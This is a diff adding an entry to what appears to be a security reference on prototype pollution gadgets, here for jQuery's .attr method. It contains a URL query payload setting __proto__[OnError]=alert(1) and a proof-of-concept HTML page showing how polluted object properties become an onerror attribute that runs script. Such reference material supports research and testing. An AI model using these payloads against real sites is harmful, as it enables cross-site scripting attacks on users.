@@ -136,3 +136,23 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 </script>
 ```
 
+### $(x).attr jQuery >= 1.8.0
+
+* Can be exploited through String.prototype
+* Sets the attribute of an element
+
+```
+?__proto__[OnError]=alert(1)&__proto__[SRC]=fakeimagewontload
+```
+
+```html
+<img id="test" src=realimage.jpg>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js></script>
+<script>
+  Object.prototype.OnError = 'alert(1)';
+  Object.prototype.SRC = 'fakeimagewontload.jpg';
+</script>
+<script>
+$('#test').attr({"width":"100%"}) // The {} is being polluted with extra attributes
+</script>
+```
